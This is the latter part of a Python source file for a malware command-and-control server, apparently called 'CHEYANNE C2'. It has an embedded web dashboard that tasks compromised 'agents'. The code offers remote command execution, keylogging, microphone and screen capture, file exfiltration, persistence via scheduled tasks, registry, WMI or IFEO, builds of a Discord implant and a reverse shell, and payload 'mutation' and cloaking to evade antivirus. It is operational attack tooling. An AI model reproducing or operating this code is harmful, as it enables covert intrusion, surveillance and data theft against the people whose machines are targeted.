    if (!agentList || !agentList.length) {
        panel.innerHTML = '<div style="color:var(--dim);font-size:11px;padding:4px">No agents connected</div>';
        opsEl.style.display = 'none';
        return;
    }
    panel.innerHTML = agentList.map(a => `
        <div class="agent-item ${selectedAgent===a.id?'selected':''}" onclick="selectAgent('${a.id}')">
            <div class="agent-dot ${a.connected?'alive':'dead'}"></div>
            <div>
                <div class="agent-host">${escHtml(a.hostname)}</div>
                <div class="agent-meta">${escHtml(a.username)} · ${escHtml(a.ip)} ${a.admin?'(ADMIN)':''}</div>
            </div>
            <span class="agent-id" style="margin-left:auto">${a.id}</span>
        </div>
    `).join('');
    opsEl.style.display = selectedAgent ? 'grid' : 'none';
}

function selectAgent(id) {
    selectedAgent = selectedAgent === id ? null : id;
    fetchAgents();
}

async function fetchAgents() {
    try {
        const r = await fetch('/api/agents');
        const d = await r.json();
        renderAgents(d.agents);
    } catch(e) {}
}

async function agentOp(op) {
    if (!selectedAgent) return;
    let body = {op: op};

    if (op === 'exec') {
        const cmd = prompt('Command to execute:');
        if (!cmd) return;
        body.cmd = cmd;
    } else if (op === 'scan') {
        const path = prompt('File path to scan:');
        if (!path) return;
        body.path = path;
    } else if (op === 'ls') {
        const path = prompt('Directory path:', '.');
        if (path === null) return;
        body.path = path || '.';
    } else if (op === 'mic') {
        const dur = prompt('Recording duration (seconds):', '10');
        if (!dur) return;
        body.duration = parseInt(dur) || 10;
    } else if (op === 'keylog') {
        const dur = prompt('Keylog duration (seconds):', '30');
        if (!dur) return;
        body.duration = parseInt(dur) || 30;
    } else if (op === 'sftp_get') {
        const path = prompt('Remote file path to download:');
        if (!path) return;
        body.path = path;
    } else if (op === 'sftp_sync') {
        const path = prompt('Remote directory to sync:', '.');
        if (path === null) return;
        body.path = path || '.';
    } else if (op === 'persist') {
        const method = prompt('Persistence method (schtask/registry/wmi/ifeo):', 'schtask');
        if (!method) return;
        body.method = method;
    } else if (op === 'vnc') {
        const dur = prompt('VNC stream duration (seconds):', '60');
        if (!dur) return;
        body.duration = parseInt(dur) || 60;
        const fps = prompt('Frames per second:', '2');
        body.fps = parseInt(fps) || 2;
    }

    try {
        await fetch('/api/agents/' + selectedAgent + '/task', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body),
        });
    } catch(e) {}
}

async function tcpOp(op) {
    let body = {op: op};
    if (op === 'kill') {
        const proc = prompt('Process name to kill (e.g. notepad.exe):');
        if (!proc) return;
        body.target = proc;
    } else if (op === 'watch') {
        const interval = prompt('Refresh interval (seconds):', '5');
        if (interval === null) return;
        body.interval = parseInt(interval) || 5;
    }
    try {
        const r = await fetch('/api/tcp/' + op, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body),
        });
        const d = await r.json();
        if (d.error) alert(d.error);
        fetchStatus();
    } catch(e) {}
}

fetchStatus();
fetchConsole();
fetchAgents();
setInterval(fetchStatus, 3000);
setInterval(fetchConsole, 400);
setInterval(fetchAgents, 2000);
</script>
</body>
</html>"""


class VaderHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def _json(self, data, code=200):
        body = json.dumps(data).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/":
            self._html(DASHBOARD_HTML)
        elif path == "/api/status":
            self._json(get_status())
        elif path == "/api/console":
            with console_lock:
                lines = list(console_buf)
            self._json({"lines": lines})
        elif path == "/api/agents":
            with agents_lock:
                agent_list = []
                for aid, a in agents.items():
                    agent_list.append({
                        "id": a["id"],
                        "hostname": a["hostname"],
                        "username": a["username"],
                        "ip": a["ip"],
                        "os": a.get("os", "?"),
                        "defender": a.get("defender", "?"),
                        "admin": a.get("admin", False),
                        "connected": a["connected"],
                        "connected_at": a.get("connected_at", "?"),
                    })
            self._json({"agents": agent_list})
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/api/clear":
            with console_lock:
                console_buf.clear()
            self._json({"ok": True})
            return

        if path == "/api/cancel":
            cancel_operation()
            self._json({"ok": True})
            return

        ops = {
            "/api/run/compile": (
                "COMPILE ALL",
                [sys.executable, os.path.join(ROOT, "deploy.py"), "--compile"],
            ),
            "/api/run/scan": (
                "SCAN ALL",
                [sys.executable, os.path.join(ROOT, "deploy.py"), "--status"],
            ),
            "/api/run/darkroom": (
                "DARK ROOM TEST",
                [os.path.join(ROOT, "dark_room", "dark_room.exe"), "--test"],
            ),
            "/api/run/mutate": (
                "MUTATE ALL KEYS",
                [sys.executable, os.path.join(ROOT, "mutate.py")],
            ),
            "/api/run/cloak": (
                "BUILD CLOAK",
                [sys.executable, os.path.join(ROOT, "cloak", "build_cloak.py"), "--scan"],
            ),
            "/api/run/keygen": (
                "REGENERATE PAYLOAD",
                [sys.executable, os.path.join(ROOT, "cloak", "gen_payload.py")],
            ),
            "/api/run/recon": (
                "RECON",
                [sys.executable, os.path.join(ROOT, "deploy.py"), "--recon"],
            ),
            "/api/run/keystatus": (
                "KEY STATUS",
                [sys.executable, os.path.join(ROOT, "mutate.py"), "--status"],
            ),
            "/api/run/pentest": (
                "FULL PENTEST AUTOMATION",
                [sys.executable, os.path.join(ROOT, "deploy.py"), "--pentest", "--skip-recon"],
            ),
            "/api/run/ghost_test": (
                "GHOST ENCODE TEST",
                [sys.executable, os.path.join(os.path.dirname(ROOT), "ghost-encoder", "ghost_encode.py"), "--test"],
            ),
            "/api/run/c2shell": (
                "C2 SHELL",
                [sys.executable, os.path.join(ROOT, "shell", "vader_c2_v2.py")],
            ),
            "/api/run/implant": (
                "BUILD DISCORD IMPLANT",
                [sys.executable, os.path.join(ROOT, "deploy.py"), "--implant"],
            ),
            "/api/run/handler": (
                "HANDLER AI OPERATOR",
                [sys.executable, os.path.join(ROOT, "cheyanne_agent.py")],
            ),
            "/api/run/op_sessions": (
                "LIST SESSIONS",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_sessions; op_sessions()"],
            ),
            "/api/run/op_screenshot": (
                "SCREENSHOT TARGET",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_screenshot; op_screenshot()"],
            ),
            "/api/run/op_browse": (
                "BROWSE TARGET FILES",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_browse; op_browse()"],
            ),
            "/api/run/op_exfil": (
                "EXFIL FILE FROM TARGET",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_exfil; op_exfil()"],
            ),
            "/api/run/op_upload": (
                "UPLOAD FILE TO TARGET",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_upload; op_upload()"],
            ),
            "/api/run/op_recon": (
                "RECON TARGET",
                [sys.executable, "-c", "import sys; sys.path.insert(0, r'" + ROOT.replace("\\", "\\\\") + "'); from cheyanne_ops import op_recon; op_recon()"],
            ),
        }

        if path == "/api/run/fresh":
            if op_running.is_set():
                self._json({"error": f"Operation already running: {op_name}"}, 409)
                return
            def _fresh():
                try:
                    _s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    _s.connect(("8.8.8.8", 80))
                    my_ip = _s.getsockname()[0]
                    _s.close()
                except Exception:
                    my_ip = "192.168.1.92"
                steps = [
                    ("MUTATE ALL KEYS", [sys.executable, os.path.join(ROOT, "mutate.py")]),
                    ("COMPILE SHELL", [sys.executable, os.path.join(ROOT, "deploy.py"), "--compile-shell", my_ip, "4443"]),
                    ("SCAN ALL", [sys.executable, os.path.join(ROOT, "deploy.py"), "--status"]),
                ]
                for step_name, cmd in steps:
                    console_write(f"[*] FRESH BUILD — {step_name}")
                    run_operation(f"FRESH: {step_name}", cmd)
                    while op_running.is_set():
                        time.sleep(0.5)
                console_write("[+] FRESH BUILD COMPLETE — all hashes unique")
            threading.Thread(target=_fresh, daemon=True).start()
            self._json({"ok": True, "operation": "FRESH BUILD"})

        elif path in ops:
            name, cmd = ops[path]
            if op_running.is_set():
                self._json({"error": f"Operation already running: {op_name}"}, 409)
                return

            if path == "/api/run/darkroom" and not os.path.exists(cmd[0]):
                self._json({"error": "dark_room.exe not built"}, 400)
                return

            run_operation(name, cmd)
            self._json({"ok": True, "operation": name})

        elif path.startswith("/api/agents/") and path.endswith("/task"):
            agent_id = path.split("/")[3]
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length)) if length else {}
            except Exception:
                body = {}
            op = body.pop("op", "")
            if not op:
                self._json({"error": "Missing 'op' field"}, 400)
                return
            result = dispatch_task(agent_id, op, **body)
            code = 200 if "ok" in result else 400
            self._json(result, code)

        elif path.startswith("/api/tcp/"):
            tcp_cmd = path.split("/api/tcp/")[1]
            try:
                length = int(self.headers.get("Content-Length", 0))
                body = json.loads(self.rfile.read(length)) if length else {}
            except Exception:
                body = {}

            tcp_scripts = {
                "deploy": "deploy",
                "screenshot": "screenshot",
                "watch": "watch",
                "recon": "recon",
                "persist": "persist",
                "kill": "kill",
            }
            if tcp_cmd not in tcp_scripts:
                self._json({"error": f"Unknown TCP command: {tcp_cmd}"}, 400)
                return
            if op_running.is_set():
                self._json({"error": f"Operation already running: {op_name}"}, 409)
                return

            script = os.path.join(ROOT, "shell", "vader_c2_v2.py")
            tcp_arg = tcp_cmd
            if tcp_cmd == "kill" and body.get("target"):
                tcp_arg = f"kill {body['target']}"
            elif tcp_cmd == "watch" and body.get("interval"):
                tcp_arg = f"watch {body['interval']}"
            cmd = [sys.executable, script, "--tcp-cmd", tcp_arg]
            run_operation(f"TCP: {tcp_cmd.upper()}", cmd)
            self._json({"ok": True, "operation": tcp_cmd})

        elif path.startswith("/api/agents/") and path.endswith("/kill"):
            agent_id = path.split("/")[3]
            with agents_lock:
                info = agents.get(agent_id)
            if info and info.get("sock"):
                try:
                    agent_send(info["sock"], {"type": "task", "id": "kill", "op": "exit"})
                    info["sock"].close()
                except Exception:
                    pass
                console_write(f"[-] Killed agent {agent_id}")
                self._json({"ok": True})
            else:
                self._json({"error": "Agent not found"}, 404)

        else:
            self.send_response(404)
            self.end_headers()


def main():
    console_write("CHEYANNE C2 Dashboard initialised")
    console_write(f"Defender: {get_defender_version()}")
    console_write(f"Host: {os.environ.get('COMPUTERNAME', 'UNKNOWN')}")

    built = sum(1 for p in KILL_CHAIN if check_built(p["binary"]))
    console_write(f"Kill chain: {built}/{len(KILL_CHAIN)} built")

    tool_built = sum(1 for t in TOOLS if check_built(t["path"]))
    console_write(f"Arsenal: {tool_built}/{len(TOOLS)} available")
    console_write(f"{'─'*50}")
    console_write("Dashboard ready. Awaiting orders.")

    threading.Thread(target=agent_listener, daemon=True).start()

    bind = "0.0.0.0"
    server = HTTPServer((bind, PORT), VaderHandler)

    G = "\033[38;2;0;255;65m"
    D = "\033[38;2;85;85;85m"
    W = "\033[38;2;255;255;255m"
    R = "\033[0m"

    BL = "\033[38;2;0;56;184m"
    GD = "\033[38;2;255;215;0m"
    print(f"""
{BL}  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{R}
{GD}╲ ╲  ╲  │ ╲ │ ╲ │  │ ╱ │ ╱ │  ╱  ╱ ╱{R}
{GD} ╲  ╲──╲──╲──╲─╲─│─╱─╱──╱──╱──╱  ╱{R}
{BL}━━━━━━━━━━━━━━━━━━━━{W}✡{BL}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{R}
{W}   THE  IRON-SUN  ·  AUSTRALIAN  ARMY{R}
{BL}  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓{R}
{D}  ──────────────────────────────────────────{R}
{D}  22DIV{D} // {W}george wu{D} // {G}Web Dashboard{R}
{D}  ──────────────────────────────────────────{R}

{G}  [*]{R} Dashboard running at {W}http://127.0.0.1:{PORT}{R}
{G}  [*]{R} Agent listener on {W}0.0.0.0:{AGENT_PORT}{R}
{D}  [*] Ctrl+C to stop{R}
""")

    import webbrowser
    webbrowser.open(f"http://127.0.0.1:{PORT}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{D}  The hunt never ends.{R}\n")
        server.shutdown()


if __name__ == "__main__":
    main()
